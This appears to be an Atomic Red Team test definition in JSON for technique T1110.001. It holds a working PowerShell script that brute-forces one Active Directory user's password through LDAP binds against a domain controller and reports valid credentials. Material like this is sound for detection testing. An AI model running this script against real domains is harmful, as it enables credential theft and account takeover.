{
  "id": "c2969434-672b-4ec8-8df0-bbb91f40e250",
  "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
  "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "0f2da858-157d-44b0-a255-ad3658f44bf7",
      "type": "execute-command",
      "data": {
        "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "tags": [
    "T1110.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "domain",
      "type": "string",
      "description": "Active Directory domain FQDN",
      "value": "$env:UserDnsDomain"
    },
    {
      "name": "auth",
      "type": "string",
      "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
      "value": "NTLM"
    },
    {
      "name": "user",
      "type": "string",
      "description": "Account to bruteforce",
      "value": "$ENV:USERNAME"
    },
    {
      "name": "passwords_path",
      "type": "path",
      "description": "List of passwords we will attempt to brute force with",
      "value": "PathToAtomicsFolder\\T1110.001\\src\\passwords.txt"
    }
  ]
}